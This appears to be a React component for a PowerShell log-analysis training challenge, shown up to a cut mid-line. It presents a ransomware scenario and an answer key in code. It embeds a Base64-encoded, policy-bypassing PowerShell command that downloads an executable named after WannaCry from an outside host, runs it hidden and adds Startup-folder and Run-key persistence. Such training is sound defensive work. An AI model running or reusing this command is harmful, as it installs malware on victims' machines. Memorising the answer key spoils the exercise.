import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Download, CheckCircle2, XCircle } from 'lucide-react';

interface Question {
  id: number;
  text: string;
  answer: string;
  userAnswer?: string;
  isCorrect?: boolean;
}

function PowerShellChallenge() {
  const [questions, setQuestions] = useState<Question[]>([
    {
      id: 1,
      text: "What encoding method does the script use?",
      answer: "Base64"
    },
    {
      id: 2,
      text: "What is the URL from which the malicious file is downloaded?",
      answer: "http://uhxqin.biz/csgeaivqpodqs/5849b1b61e88f7461064b986a204b9c7_wannacry.exe"
    },
    {
      id: 3,
      text: "What is the hash of the downloaded malware file?",
      answer: "5849b1b61e88f7461064b986a204b9c7"
    },
    {
      id: 4,
      text: "What type of malware is being delivered by this script?",
      answer: "Ransomware"
    },
    {
      id: 5,
      text: "What is the name of the downloaded file?",
      answer: "update_service.exe"
    },
    {
      id: 6,
      text: "Which PowerShell command is used to download the file?",
      answer: "Invoke-WebRequest -Uri $update -OutFile $destinationPath"
    },
    {
      id: 7,
      text: "Where is the file stored on the system before execution?",
      answer: "TEMP"
    },
    {
      id: 8,
      text: "Which command is used to execute the downloaded file?",
      answer: "Start-Process -FilePath $destinationPath -WindowStyle Hidden"
    },
    {
      id: 9,
      text: "Which method does the script use to maintain persistence?",
      answer: "Startup folder"
    },
    {
      id: 10,
      text: "Which Windows registry key is modified to establish persistence?",
      answer: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    }
  ]);

  const handleAnswerSubmit = (id: number, answer: string) => {
    setQuestions(questions.map(q => {
      if (q.id === id) {
        return {
          ...q,
          userAnswer: answer.toLowerCase(),
          isCorrect: answer.toLowerCase() === q.answer.toLowerCase()
        };
      }
      return q;
    }));
  };

  return (
    <div className="min-h-screen bg-background text-white">
      {/* Navigation */}
      <nav className="bg-primary-dark border-b border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16 items-center">
            <div className="flex items-center space-x-4">
              <Link to="/challenges" className="text-primary-blue hover:text-primary-blue/80 flex items-center">
                <ArrowLeft className="w-5 h-5 mr-2" />
                Back to Challenges
              </Link>
            </div>
          </div>
        </div>
      </nav>

      {/* Banner Image */}
      <div className="w-full h-48 relative overflow-hidden">
        <img 
          src="/powershell-banner.jpg"
          alt="PowerShell Challenge Banner"
          className="w-full h-full object-cover"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-transparent to-background"></div>
      </div>

      {/* Challenge Content */}
      <div className="max-w-4xl mx-auto px-4 py-12 -mt-16 relative z-10">
        <h1 className="text-3xl font-bold mb-8">PowerShell Logs Analysis Challenge</h1>
        
        {/* Introduction */}
        <div className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 mb-8">
          <h2 className="text-xl font-semibold mb-4">Challenge Introduction</h2>
          <p className="text-gray-400 mb-6">
            An endpoint within your organization was suddenly encrypted, leaving critical files inaccessible. 
            The IT team discovered that a PowerShell command was executed shortly before the encryption occurred, 
            but they need your expertise to understand what happened and how it led to the encryption.
          </p>
          <p className="text-gray-400 mb-6">
            The IT team has provided you with the following PowerShell command that was executed prior to the encryption:
          </p>
          <pre className="bg-gray-800 text-gray-400 p-4 rounded-md overflow-auto">
            powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JHVwZGF0ZSA9ICJodHRwOi8vdWh4cWluLmJpei9jc2dlYWl2cXBvZHFzLzU4NDliMWI2MWU4OGY3NDYxMDY0Yjk4NmEyMDRiOWM3X3dhbm5hY3J5LmV4ZSIgIA0KJGRlc3RpbmF0aW9uUGF0aCA9ICIkZW52OlRFTVBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cGRhdGUgLU91dEZpbGUgJGRlc3RpbmF0aW9uUGF0aA0KDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdGluYXRpb25QYXRoIC1XaW5kb3dTdHlsZSBIaWRkZW4NCg0KJHN0YXJ0dXBQYXRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KQ29weS1JdGVtIC1QYXRoICRkZXN0aW5hdGlvblBhdGggLURlc3RpbmF0aW9uICRzdGFydHVwUGF0aCAtRm9yY2UNCg0KTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAtTmFtZSAiVXBkYXRlU2VydmljZSIgLVZhbHVlICRkZXN0aW5hdGlvblBhdGggLVByb3BlcnR5VHlwZSBTdHJpbmcgLUZvcmNlDQoNCiRlbmNvZGVkQ29tbWFuZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygncG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlICcgKyAkZGVzdGluYXRpb25QYXRoKykNClN0YXJ0LVByb2Nlc3MgInBvd2Vyc2hlbGwuZXhlIiAtQXJndW1lbnRMaXN0ICItRW5jb2RlZENvbW1hbmQgJGVuY29kZWRDb21tYW5kIiAtV2luZG93U3R5bGUgSGlkZGVu
          </pre>

          {/* Download Button */}
          <button 
            className="flex items-center bg-primary-blue text-background px-4 py-2 rounded-md hover:bg-secondary-blue transition"
            onClick={() => window.alert('Download functionality will be implemented!')}
          >
            <Download className="w-5 h-5 mr-2" />
            Download Logs
          </button>
        </div>

        {/* Questions */}
        <div className="space-y-6">
          {questions.map((question) => (
            <div key={question.id} className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20">
              <div className="flex items-start justify-between">
                <div className="flex-1">
                  <h3 className="text-lg font-semibold mb-4">{question.text}</h3>
                  <div className="flex items-center space-x-4">
                    <input
                      type="text"
                      className="bg-background border border-primary-blue/20 rounded-md px-4 py-2 focus:outline-none focus:border-primary-blue"
                      placeholder="Enter your answer"
                      onChange={(e) => handleAnswerSubmit(question.id
